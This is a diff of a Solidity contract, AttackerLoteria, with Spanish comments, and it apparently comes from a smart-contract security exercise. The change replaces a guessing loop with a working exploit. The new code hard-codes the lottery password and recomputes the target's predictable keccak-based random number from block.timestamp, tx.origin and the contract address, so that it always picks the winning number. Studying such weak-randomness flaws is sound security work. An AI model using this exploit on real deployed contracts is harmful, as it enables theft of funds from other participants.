@@ -75,30 +75,27 @@ interface ILoteriaConPassword {
 }
 
 contract AttackerLoteria {
-    ILoteriaConPassword public loteria;
-    uint8 private constant PASSWORD = 1; // Asegúrate de que este es el password que hace que el hash coincida con FACTOR.
-
-    // Constructor para inicializar la dirección de LoteriaConPassword
-    constructor(address _loteriaAddress) {
-        loteria = ILoteriaConPassword(_loteriaAddress);
-    }
-
-    function attack() public payable {
-        require(msg.value >= 1500, "Insufficient funds for the attack");
-
-        // Asumir que tenemos alguna forma de predecir o ajustar el número ganador, si es posible
-        // Este loop es más una formalidad ya que el número ganador es difícil de predecir sin conocer el estado exacto del bloque
-        for (uint256 i = 0; i < 10; i++) {
-            try loteria.participarEnLoteria{value: 1500}(PASSWORD, i) {
-                // Si una transacción es exitosa y el contrato gana, rompe el bucle
-                break;
-            } catch {
-                // Si la transacción falla, intenta con el siguiente número
-                continue;
-            }
-        }
-    }
-
-    // Función para recibir ether, necesaria para recibir premios de la lotería
     receive() external payable {}
+
+    function attack(address _loteriaAddress) public payable {
+        require(msg.value == 1500, "Debe enviar exactamente 1500 wei para participar");
+
+        ILoteriaConPassword loteria = ILoteriaConPassword(_loteriaAddress);
+
+        uint8 password = 202;
+        uint256 factorHash = uint256(keccak256(abi.encodePacked(password)));
+
+        uint256 numRandom = uint256(keccak256(abi.encodePacked(
+            factorHash,
+            uint256(1500),
+            tx.origin,
+            block.timestamp,
+            address(this)
+        )));
+
+        uint256 numeroGanador = numRandom % 10;
+
+        // Participar en la lotería usando el password y el número ganador calculado
+        loteria.participarEnLoteria{value: 1500}(password, numeroGanador);
+    }
 }
